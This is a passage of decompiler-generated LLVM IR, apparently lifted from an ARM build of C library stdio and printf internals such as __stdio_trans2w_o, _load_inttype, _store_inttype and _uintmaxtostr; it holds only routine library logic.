  store i32 %v9_16774, i32* @r6, align 4
  store i32 %v12_16774, i32* @r7, align 4
  ret i32 %v0_168a4

; uselistorder directives
  uselistorder i32 %v2_1685c, { 1, 0 }
  uselistorder i32 %v2_16834, { 1, 0 }
  uselistorder i32 %v0_1681c.v0_16828, { 1, 2, 0, 3 }
  uselistorder i32 %v0_16828, { 1, 0, 2 }
  uselistorder i32 %v2_167a8, { 2, 0, 1, 3 }
  uselistorder i32 %v9_16774, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %arg3, { 0, 1, 2, 7, 6, 5, 8, 3, 4 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_168a4, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_16890, { 0, 2, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_168ac = load i32, i32* @r4, align 4
  store i32 %v3_168ac, i32* %stack_var_-8, align 4
  %v3_168b0 = load i8, i8* %arg1, align 1
  %v4_168b0 = zext i8 %v3_168b0 to i32
  store i32 %v4_168b0, i32* %r2.global-to-local, align 4
  %v2_168b4 = add i32 %tmp, 1
  %v3_168b4 = inttoptr i32 %v2_168b4 to i8*
  %v4_168b4 = load i8, i8* %v3_168b4, align 1
  %v5_168b4 = zext i8 %v4_168b4 to i32
  store i32 %v5_168b4, i32* %r3.global-to-local, align 4
  %v4_168b8 = mul nuw nsw i32 %v5_168b4, 256
  %v5_168b8 = or i32 %v4_168b8, %v4_168b0
  store i32 %v5_168b8, i32* %r2.global-to-local, align 4
  %v2_168bc = and i32 %v5_168b8, %arg2
  %v4_168bc = icmp eq i32 %v2_168bc, 0
  store i1 %v4_168bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_168bc, label %dec_label_pc_168c8, label %dec_label_pc_168e0

dec_label_pc_168c8:                               ; preds = %entry
  %v1_168c8 = and i32 %v5_168b8, 2176
  %v2_168c8 = icmp eq i32 %v1_168c8, 0
  store i1 %v2_168c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_168c8, label %dec_label_pc_168d0, label %dec_label_pc_168f4

dec_label_pc_168d0:                               ; preds = %dec_label_pc_168c8
  %v2_168d0 = or i32 %v5_168b8, %arg2
  store i32 %v2_168d0, i32* %r2.global-to-local, align 4
  %v3_168d4 = sdiv i32 %v2_168d0, 256
  store i32 %v3_168d4, i32* %r3.global-to-local, align 4
  %v1_168d8 = trunc i32 %v3_168d4 to i8
  store i8 %v1_168d8, i8* %v3_168b4, align 1
  %v0_168dc = load i32, i32* %r2.global-to-local, align 4
  %v1_168dc = trunc i32 %v0_168dc to i8
  store i8 %v1_168dc, i8* %arg1, align 1
  %v0_168e0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_168e0

dec_label_pc_168e0:                               ; preds = %entry, %dec_label_pc_168d0
  %v0_1692c = phi i32 [ %tmp, %entry ], [ %v0_168e0.pre, %dec_label_pc_168d0 ]
  %v1_168e0 = inttoptr i32 %v0_1692c to i8*
  %v2_168e0 = load i8, i8* %v1_168e0, align 1
  %v3_168e0 = zext i8 %v2_168e0 to i32
  store i32 %v3_168e0, i32* %r2.global-to-local, align 4
  %v1_168e4 = add i32 %v0_1692c, 1
  %v2_168e4 = inttoptr i32 %v1_168e4 to i8*
  %v3_168e4 = load i8, i8* %v2_168e4, align 1
  %v4_168e4 = zext i8 %v3_168e4 to i32
  store i32 %v4_168e4, i32* %r3.global-to-local, align 4
  %v4_168e8 = mul nuw nsw i32 %v4_168e4, 256
  %v1_168ec = and i32 %v3_168e0, 32
  %v2_168ec = icmp eq i32 %v1_168ec, 0
  store i1 %v2_168ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_168ec, label %dec_label_pc_1691c, label %dec_label_pc_168f4

dec_label_pc_168f4:                               ; preds = %dec_label_pc_168c8, %dec_label_pc_168e0
  %v0_168f4 = call i32 @__errno_location()
  store i32 %v0_168f4, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_168fc = inttoptr i32 %v0_168f4 to i32*
  store i32 9, i32* %v2_168fc, align 4
  br label %dec_label_pc_16900

dec_label_pc_16900:                               ; preds = %dec_label_pc_16944, %dec_label_pc_168f4
  %v0_16900 = load i32, i32* @r4, align 4
  %v1_16900 = inttoptr i32 %v0_16900 to i32*
  %v2_16900 = load i32, i32* %v1_16900, align 4
  %v1_16904 = or i32 %v2_16900, 8
  store i32 %v1_16904, i32* %r3.global-to-local, align 4
  %v3_16908 = sdiv i32 %v2_16900, 256
  store i32 %v3_16908, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_16910 = trunc i32 %v3_16908 to i8
  %v3_16910 = add i32 %v0_16900, 1
  %v4_16910 = inttoptr i32 %v3_16910 to i8*
  store i8 %v1_16910, i8* %v4_16910, align 1
  %v0_16914 = load i32, i32* %r3.global-to-local, align 4
  %v1_16914 = trunc i32 %v0_16914 to i8
  %v2_16914 = load i32, i32* @r4, align 4
  %v3_16914 = inttoptr i32 %v2_16914 to i8*
  store i8 %v1_16914, i8* %v3_16914, align 1
  %v2_16918 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16918, i32* @r4, align 4
  ret i32 -1

dec_label_pc_1691c:                               ; preds = %dec_label_pc_168e0
  %tmp15 = urem i8 %v2_168e0, 4
  %v2_1691c = icmp eq i8 %tmp15, 0
  store i1 %v2_1691c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1691c, label %dec_label_pc_16980, label %dec_label_pc_16924

dec_label_pc_16924:                               ; preds = %dec_label_pc_1691c
  %v1_16924 = and i32 %v3_168e0, 4
  store i32 %v1_16924, i32* @r1, align 4
  %v2_16924 = icmp eq i32 %v1_16924, 0
  store i1 %v2_16924, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16924, label %dec_label_pc_1692c, label %dec_label_pc_1695c

dec_label_pc_1692c:                               ; preds = %dec_label_pc_16924
  %v1_1692c = add i32 %v0_1692c, 20
  %v2_1692c = inttoptr i32 %v1_1692c to i32*
  %v3_1692c = load i32, i32* %v2_1692c, align 4
  store i32 %v3_1692c, i32* %r2.global-to-local, align 4
  %v1_16930 = add i32 %v0_1692c, 16
  %v2_16930 = inttoptr i32 %v1_16930 to i32*
  %v3_16930 = load i32, i32* %v2_16930, align 4
  store i32 %v3_16930, i32* %r3.global-to-local, align 4
  %v9_16934 = icmp eq i32 %v3_1692c, %v3_16930
  store i1 %v9_16934, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16934, label %dec_label_pc_1693c, label %dec_label_pc_16944

dec_label_pc_1693c:                               ; preds = %dec_label_pc_1692c
  %v1_1693c = and i32 %v3_168e0, 2
  %v2_1693c = icmp eq i32 %v1_1693c, 0
  store i1 %v2_1693c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1693c, label %dec_label_pc_1695c, label %dec_label_pc_16944

dec_label_pc_16944:                               ; preds = %dec_label_pc_1692c, %dec_label_pc_1693c
  %v1_16944 = and i32 %v4_168e8, 1024
  %v2_16944 = icmp eq i32 %v1_16944, 0
  store i1 %v2_16944, i1* %cpsr_z.global-to-local, align 1
  %tmp13 = udiv i32 %v1_16944, 1024
  %tmp14 = add nuw nsw i32 %tmp13, 1
  store i32 %tmp14, i32* @r2, align 4
  %v0_16950 = call i32 @__GI_fseek()
  store i32 %v0_16950, i32* %r0.global-to-local, align 4
  %v2_16954 = icmp eq i32 %v0_16950, 0
  store i1 %v2_16954, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16954, label %.dec_label_pc_1695c_crit_edge, label %dec_label_pc_16900

.dec_label_pc_1695c_crit_edge:                    ; preds = %dec_label_pc_16944
  %v0_1695c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1695c

dec_label_pc_1695c:                               ; preds = %.dec_label_pc_1695c_crit_edge, %dec_label_pc_16924, %dec_label_pc_1693c
  %v2_1696c = phi i32 [ %v0_1695c.pre, %.dec_label_pc_1695c_crit_edge ], [ %v0_1692c, %dec_label_pc_16924 ], [ %v0_1692c, %dec_label_pc_1693c ]
  %v1_1695c = inttoptr i32 %v2_1696c to i32*
  %v2_1695c = load i32, i32* %v1_1695c, align 4
  store i32 %v2_1695c, i32* %r3.global-to-local, align 4
  %v1_16960 = add i32 %v2_1696c, 8
  %v2_16960 = inttoptr i32 %v1_16960 to i32*
  %v3_16960 = load i32, i32* %v2_16960, align 4
  store i32 %v3_16960, i32* %r1.global-to-local, align 4
  %v1_16964 = and i32 %v2_1695c, -4
  store i32 %v1_16964, i32* %r3.global-to-local, align 4
  %v3_16968 = sdiv i32 %v2_1695c, 256
  store i32 %v3_16968, i32* %r2.global-to-local, align 4
  %v1_1696c = trunc i32 %v3_16968 to i8
  %v3_1696c = add i32 %v2_1696c, 1
  %v4_1696c = inttoptr i32 %v3_1696c to i8*
  store i8 %v1_1696c, i8* %v4_1696c, align 1
  %v0_16970 = load i32, i32* %r1.global-to-local, align 4
  %v1_16970 = load i32, i32* @r4, align 4
  %v2_16970 = add i32 %v1_16970, 20
  %v3_16970 = inttoptr i32 %v2_16970 to i32*
  store i32 %v0_16970, i32* %v3_16970, align 4
  %v0_16974 = load i32, i32* %r3.global-to-local, align 4
  %v1_16974 = trunc i32 %v0_16974 to i8
  %v2_16974 = load i32, i32* @r4, align 4
  %v3_16974 = inttoptr i32 %v2_16974 to i8*
  store i8 %v1_16974, i8* %v3_16974, align 1
  %v0_16978 = load i32, i32* %r1.global-to-local, align 4
  %v1_16978 = load i32, i32* @r4, align 4
  %v2_16978 = add i32 %v1_16978, 24
  %v3_16978 = inttoptr i32 %v2_16978 to i32*
  store i32 %v0_16978, i32* %v3_16978, align 4
  %v0_1697c = load i32, i32* %r1.global-to-local, align 4
  %v1_1697c = load i32, i32* @r4, align 4
  %v2_1697c = add i32 %v1_1697c, 16
  %v3_1697c = inttoptr i32 %v2_1697c to i32*
  store i32 %v0_1697c, i32* %v3_1697c, align 4
  %v0_16980.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16980

dec_label_pc_16980:                               ; preds = %dec_label_pc_1691c, %dec_label_pc_1695c
  %v2_1698c = phi i32 [ %v0_1692c, %dec_label_pc_1691c ], [ %v0_16980.pre, %dec_label_pc_1695c ]
  %v1_16980 = inttoptr i32 %v2_1698c to i32*
  %v2_16980 = load i32, i32* %v1_16980, align 4
  %v1_16984 = or i32 %v2_16980, 64
  store i32 %v1_16984, i32* %r2.global-to-local, align 4
  %v3_16988 = sdiv i32 %v2_16980, 256
  store i32 %v3_16988, i32* %r3.global-to-local, align 4
  %v1_1698c = trunc i32 %v3_16988 to i8
  %v3_1698c = add i32 %v2_1698c, 1
  %v4_1698c = inttoptr i32 %v3_1698c to i8*
  store i8 %v1_1698c, i8* %v4_1698c, align 1
  %v0_16990 = load i32, i32* @r4, align 4
  %v1_16990 = add i32 %v0_16990, 1
  %v2_16990 = inttoptr i32 %v1_16990 to i8*
  %v3_16990 = load i8, i8* %v2_16990, align 1
  %v4_16990 = zext i8 %v3_16990 to i32
  %v3_16994 = mul nuw nsw i32 %v4_16990, 256
  store i32 %v3_16994, i32* %r3.global-to-local, align 4
  %v1_16998 = and i32 %v3_16994, 2816
  store i32 %v1_16998, i32* %r0.global-to-local, align 4
  %v2_16998 = icmp eq i32 %v1_16998, 0
  store i1 %v2_16998, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16998, label %bb9, label %.thread1

bb9:                                              ; preds = %dec_label_pc_16980
  %v2_1699c = add i32 %v0_16990, 12
  %v3_1699c = inttoptr i32 %v2_1699c to i32*
  %v4_1699c = load i32, i32* %v3_1699c, align 4
  store i32 %v4_1699c, i32* %r3.global-to-local, align 4
  br label %bb10

.thread1:                                         ; preds = %dec_label_pc_16980
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb10

bb10:                                             ; preds = %bb9, %.thread1
  %v0_169a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_169a4 = trunc i32 %v0_169a4 to i8
  %v3_169a4 = inttoptr i32 %v0_16990 to i8*
  store i8 %v1_169a4, i8* %v3_169a4, align 1
  %v0_169a8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_169a8, label %bb11, label %bb12

bb11:                                             ; preds = %bb10
  %v1_169a8 = load i32, i32* %r3.global-to-local, align 4
  %v2_169a8 = load i32, i32* @r4, align 4
  %v3_169a8 = add i32 %v2_169a8, 28
  %v4_169a8 = inttoptr i32 %v3_169a8 to i32*
  store i32 %v1_169a8, i32* %v4_169a8, align 4
  br label %bb12

bb12:                                             ; preds = %bb10, %bb11
  %v2_169ac = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_169ac, i32* @r4, align 4
  %v8_169ac = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_169ac

; uselistorder directives
  uselistorder i32 %v3_16994, { 1, 0 }
  uselistorder i32 %v3_16988, { 1, 0 }
  uselistorder i32 %v3_16968, { 1, 0 }
  uselistorder i32 %v2_1696c, { 0, 2, 1 }
  uselistorder i1 %v2_1691c, { 1, 0 }
  uselistorder i32 %v3_16908, { 1, 0 }
  uselistorder i32 %v0_1692c, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v3_168d4, { 1, 0 }
  uselistorder i32 %v5_168b8, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %dec_label_pc_16980, { 1, 0 }
  uselistorder label %dec_label_pc_1695c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_16944, { 1, 0 }
  uselistorder label %dec_label_pc_168f4, { 1, 0 }
  uselistorder label %dec_label_pc_168e0, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %v0_169b0 = load i32, i32* @r2, align 4
  %v1_169b0 = icmp slt i32 %v0_169b0, 0
  %v0_169b4 = load i32, i32* @r0, align 4
  %v1_169b8 = and i32 %v0_169b4, 2048
  %v2_169ec = icmp eq i32 %v1_169b8, 0
  br i1 %v1_169b0, label %dec_label_pc_169ec, label %dec_label_pc_169c0

dec_label_pc_169c0:                               ; preds = %entry
  br i1 %v2_169ec, label %dec_label_pc_169c8, label %dec_label_pc_169f4

dec_label_pc_169c8:                               ; preds = %dec_label_pc_169c0
  %v7_169c8 = icmp eq i32 %v0_169b4, 256
  %v0_169cc = load i32, i32* @r1, align 4
  %v1_169cc = inttoptr i32 %v0_169cc to i32*
  %v2_169cc = load i32, i32* %v1_169cc, align 4
  %v2_169d0 = urem i32 %v2_169cc, 256
  %v2_169d0.v2_169cc = select i1 %v7_169c8, i32 %v2_169d0, i32 %v2_169cc
  br i1 %v7_169c8, label %.thread, label %dec_label_pc_169d8

dec_label_pc_169d8:                               ; preds = %dec_label_pc_169c8
  %v7_169d8 = icmp eq i32 %v0_169b4, 512
  br i1 %v7_169d8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_169d8
  %v4_169e0 = urem i32 %v2_169d0.v2_169cc, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_169d8, %dec_label_pc_169c8, %bb
  %v1_169e8 = phi i32 [ %v2_169cc, %dec_label_pc_169d8 ], [ %v2_169d0, %dec_label_pc_169c8 ], [ %v4_169e0, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_169e8

dec_label_pc_169ec:                               ; preds = %entry
  br i1 %v2_169ec, label %dec_label_pc_169fc, label %dec_label_pc_169f4

dec_label_pc_169f4:                               ; preds = %dec_label_pc_169c0, %dec_label_pc_169ec
  %v0_169f4 = load i32, i32* @r1, align 4
  %v1_169f4 = inttoptr i32 %v0_169f4 to i32*
  %v2_169f4 = load i32, i32* %v1_169f4, align 4
  %v3_169f4 = add i32 %v0_169f4, 4
  %v4_169f4 = inttoptr i32 %v3_169f4 to i32*
  %v5_169f4 = load i32, i32* %v4_169f4, align 4
  store i32 %v5_169f4, i32* @r1, align 4
  ret i32 %v2_169f4

dec_label_pc_169fc:                               ; preds = %dec_label_pc_169ec
  %v7_169fc = icmp eq i32 %v0_169b4, 256
  %v0_16a00 = load i32, i32* @r1, align 4
  %v1_16a00 = inttoptr i32 %v0_16a00 to i32*
  %v2_16a00 = load i32, i32* %v1_16a00, align 4
  %v2_16a04 = urem i32 %v2_16a00, 256
  %v2_16a04.v2_16a00 = select i1 %v7_169fc, i32 %v2_16a04, i32 %v2_16a00
  br i1 %v7_169fc, label %.thread2, label %dec_label_pc_16a0c

dec_label_pc_16a0c:                               ; preds = %dec_label_pc_169fc
  %v7_16a0c = icmp eq i32 %v0_169b4, 512
  br i1 %v7_16a0c, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_16a0c
  %v4_16a10 = mul i32 %v2_16a04.v2_16a00, 65536
  %v4_16a14 = sdiv i32 %v4_16a10, 65536
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_16a0c, %dec_label_pc_169fc, %bb5
  %v0_16a18 = phi i32 [ %v2_16a00, %dec_label_pc_16a0c ], [ %v2_16a04, %dec_label_pc_169fc ], [ %v4_16a14, %bb5 ]
  %v3_16a18 = ashr i32 %v0_16a18, 31
  store i32 %v3_16a18, i32* @r1, align 4
  ret i32 %v0_16a18

; uselistorder directives
  uselistorder i32 %v0_16a18, { 1, 0 }
  uselistorder i32 %v2_16a04, { 1, 0 }
  uselistorder i32 %v2_16a00, { 1, 2, 0 }
  uselistorder i32 %v2_169d0, { 1, 0 }
  uselistorder i32 %v2_169cc, { 1, 2, 0 }
  uselistorder i1 %v2_169ec, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_169f4, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @_store_inttype(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg3 to i8
  %tmp2 = ptrtoint i8* %arg1 to i32
  %v7_16a20 = icmp eq i32 %arg2, 256
  br i1 %v7_16a20, label %dec_label_pc_16a4c, label %dec_label_pc_16a28

dec_label_pc_16a28:                               ; preds = %entry
  %v7_16a28 = icmp eq i32 %arg2, 2048
  br i1 %v7_16a28, label %dec_label_pc_16a30, label %dec_label_pc_16a38

dec_label_pc_16a30:                               ; preds = %dec_label_pc_16a28
  %tmp3 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp3, align 4
  %v5_16a30 = add i32 %tmp2, 4
  %v6_16a30 = inttoptr i32 %v5_16a30 to i32*
  store i32 %arg4, i32* %v6_16a30, align 4
  ret i32 %tmp2

dec_label_pc_16a38:                               ; preds = %dec_label_pc_16a28
  %v7_16a38 = icmp eq i32 %arg2, 512
  br i1 %v7_16a38, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_16a38
  %tmp4 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp4, align 4
  ret i32 %tmp2

.thread:                                          ; preds = %dec_label_pc_16a38
  %v4_16a3c = sdiv i32 %arg3, 256
  %v1_16a48 = trunc i32 %v4_16a3c to i8
  %v4_16a48 = add i32 %tmp2, 1
  %v5_16a48 = inttoptr i32 %v4_16a48 to i8*
  store i8 %v1_16a48, i8* %v5_16a48, align 1
  br label %dec_label_pc_16a4c

dec_label_pc_16a4c:                               ; preds = %entry, %.thread
  store i8 %tmp, i8* %arg1, align 1
  ret i32 %tmp2

; uselistorder directives
  uselistorder i32 %tmp2, { 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_16a4c, { 1, 0 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg4, i32* %r7.global-to-local, align 4
  %v1_16a58 = icmp slt i32 %arg4, 0
  %v2_16a58 = icmp eq i32 %arg4, 0
  store i1 %v2_16a58, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v1_16a58, label %dec_label_pc_16a70, label %dec_label_pc_16a90

dec_label_pc_16a70:                               ; preds = %entry
  %v1_16a70 = icmp slt i32 %arg3, 0
  %v2_16a70 = icmp eq i32 %arg3, 0
  store i1 %v2_16a70, i1* %cpsr_z.global-to-local, align 1
  %v1_16a74 = sub i32 0, %arg4
  store i32 %v1_16a74, i32* %r7.global-to-local, align 4
  br i1 %v1_16a70, label %dec_label_pc_16a7c, label %dec_label_pc_16a90

dec_label_pc_16a7c:                               ; preds = %dec_label_pc_16a70
  %v1_16a80 = sub i32 0, %arg2
  store i32 %v1_16a80, i32* %r5.global-to-local, align 4
  %v2_16a80 = icmp eq i32 %arg2, 0
  %v2_16a84 = icmp eq i1 %v2_16a80, false
  %v5_16a84 = sext i1 %v2_16a84 to i32
  %v6_16a84 = sub i32 %v5_16a84, %arg3
  store i32 %v6_16a84, i32* %r6.global-to-local, align 4
  %v19_16a84 = icmp eq i32 %v6_16a84, 0
  store i1 %v19_16a84, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16a98

dec_label_pc_16a90:                               ; preds = %dec_label_pc_16a70, %entry
  br label %dec_label_pc_16a98

dec_label_pc_16a98:                               ; preds = %dec_label_pc_16a7c, %dec_label_pc_16a90
  %storemerge = phi i8 [ 0, %dec_label_pc_16a90 ], [ 1, %dec_label_pc_16a7c ]
  store i8 %storemerge, i8* %stack_var_-40, align 1
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_16aa0 = load i32, i32* %r7.global-to-local, align 4
  %v2_16aa8 = udiv i32 -1, %v0_16aa0
  store i32 %v2_16aa8, i32* %fp.global-to-local, align 4
  %v2_16ab8 = urem i32 -1, %v0_16aa0
  %v1_16abc = add i32 %v2_16ab8, 1
  store i32 %v1_16abc, i32* %sb.global-to-local, align 4
  %v9_16ac0 = icmp eq i32 %v1_16abc, %v0_16aa0
  store i1 %v9_16ac0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16ac0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_16a98
  %v1_16ac4 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_16ac4, i32* %sb.global-to-local, align 4
  %v2_16ac8 = add i32 %v2_16aa8, 1
  store i32 %v2_16ac8, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16a98, %bb
  %v0_16acc = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_16acc, i32* %sl.global-to-local, align 4
  %v0_16ad0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_16ad0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16ad4

dec_label_pc_16ad4thread-pre-split:               ; preds = %bb21
  %v0_16ad4.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_16adc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16ad4

dec_label_pc_16ad4:                               ; preds = %dec_label_pc_16ad4thread-pre-split, %.thread
  %v0_16b44 = phi i32 [ %v0_16adc.pre, %dec_label_pc_16ad4thread-pre-split ], [ %v0_16aa0, %.thread ]
  %v0_16af0 = phi i32 [ %v0_16ad4.pr, %dec_label_pc_16ad4thread-pre-split ], [ %v0_16acc, %.thread ]
  %v2_16ad4 = icmp eq i32 %v0_16af0, 0
  store i1 %v2_16ad4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16ad4, label %dec_label_pc_16b40, label %dec_label_pc_16ae4

dec_label_pc_16ae4:                               ; preds = %dec_label_pc_16ad4
  %v2_16ae4 = urem i32 %v0_16af0, %v0_16b44
  %v2_16af4 = udiv i32 %v0_16af0, %v0_16b44
  store i32 %v2_16af4, i32* %sl.global-to-local, align 4
  %v0_16b00 = load i32, i32* %r6.global-to-local, align 4
  %v2_16b04 = urem i32 %v0_16b00, %v0_16b44
  %v1_16b0c = load i32, i32* %sb.global-to-local, align 4
  %v3_16b0c = mul i32 %v1_16b0c, %v2_16ae4
  %v4_16b0c = add i32 %v3_16b0c, %v2_16b04
  store i32 %v4_16b0c, i32* %r5.global-to-local, align 4
  %v2_16b14 = udiv i32 %v0_16b00, %v0_16b44
  %v0_16b1c = load i32, i32* %fp.global-to-local, align 4
  %v3_16b1c = mul i32 %v0_16b1c, %v2_16ae4
  %v4_16b1c = add i32 %v3_16b1c, %v2_16b14
  %v2_16b24 = udiv i32 %v4_16b0c, %v0_16b44
  %v2_16b2c = add i32 %v4_16b1c, %v2_16b24
  br label %dec_label_pc_16b60

dec_label_pc_16b40:                               ; preds = %dec_label_pc_16ad4
  %v0_16b40 = load i32, i32* %r6.global-to-local, align 4
  %v2_16b58 = udiv i32 %v0_16b40, %v0_16b44
  br label %dec_label_pc_16b60

dec_label_pc_16b60:                               ; preds = %dec_label_pc_16ae4, %dec_label_pc_16b40
  %storemerge24 = phi i32 [ %v2_16b58, %dec_label_pc_16b40 ], [ %v2_16b2c, %dec_label_pc_16ae4 ]
  %v0_16b7c = phi i32 [ %v2_16b58, %dec_label_pc_16b40 ], [ %v2_16b2c, %dec_label_pc_16ae4 ]
  %v1_16b7c = phi i32 [ 0, %dec_label_pc_16b40 ], [ %v2_16af4, %dec_label_pc_16ae4 ]
  %v4_16b0c.pn = phi i32 [ %v0_16b40, %dec_label_pc_16b40 ], [ %v4_16b0c, %dec_label_pc_16ae4 ]
  store i32 %storemerge24, i32* %r6.global-to-local, align 4
  %v0_16b68 = urem i32 %v4_16b0c.pn, %v0_16b44
  %v3_16b60 = load i32, i32* %stack_var_0, align 4
  %v2_16b64 = icmp ugt i32 %v0_16b68, 8
  %v7_16b64 = icmp eq i32 %v0_16b68, 9
  store i1 %v7_16b64, i1* %cpsr_z.global-to-local, align 1
  %v1_16b6c = add i32 %v0_16b68, 48
  %v0_16b74 = load i32, i32* %r8.global-to-local, align 4
  %v1_16b74 = add i32 %v0_16b74, -1
  store i32 %v1_16b74, i32* %r8.global-to-local, align 4
  %v2_16b78 = xor i1 %v7_16b64, true
  %v3_16b78 = and i1 %v2_16b64, %v2_16b78
  %extract.t = trunc i32 %v1_16b6c to i8
  br i1 %v3_16b78, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_16b60
  %v2_16b68 = add i32 %v3_16b60, %v0_16b68
  %extract.t8 = trunc i32 %v2_16b68 to i8
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_16b60, %bb20
  %v0_16b80.off0 = phi i8 [ %extract.t, %dec_label_pc_16b60 ], [ %extract.t8, %bb20 ]
  %v2_16b7c = or i32 %v0_16b7c, %v1_16b7c
  %v4_16b7c = icmp eq i32 %v2_16b7c, 0
  store i1 %v4_16b7c, i1* %cpsr_z.global-to-local, align 1
  %v3_16b80 = inttoptr i32 %v1_16b74 to i8*
  store i8 %v0_16b80.off0, i8* %v3_16b80, align 1
  %v0_16b84 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16b84, label %dec_label_pc_16b88, label %dec_label_pc_16ad4thread-pre-split

dec_label_pc_16b88:                               ; preds = %bb21
  %v2_16b88 = load i8, i8* %stack_var_-40, align 1
  %v2_16b8c = icmp eq i8 %v2_16b88, 0
  store i1 %v2_16b8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16b8c, label %dec_label_pc_16b88..thread2_crit_edge, label %bb22

dec_label_pc_16b88..thread2_crit_edge:            ; preds = %dec_label_pc_16b88
  %v0_16b98.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb22:                                             ; preds = %dec_label_pc_16b88
  %v3_16b94 = load i32, i32* %r8.global-to-local, align 4
  %v4_16b94 = add i32 %v3_16b94, -1
  %v5_16b94 = inttoptr i32 %v4_16b94 to i8*
  store i8 45, i8* %v5_16b94, align 1
  %v6_16b94 = load i32, i32* %r8.global-to-local, align 4
  %v7_16b94 = add i32 %v6_16b94, -1
  store i32 %v7_16b94, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_16b88..thread2_crit_edge, %bb22
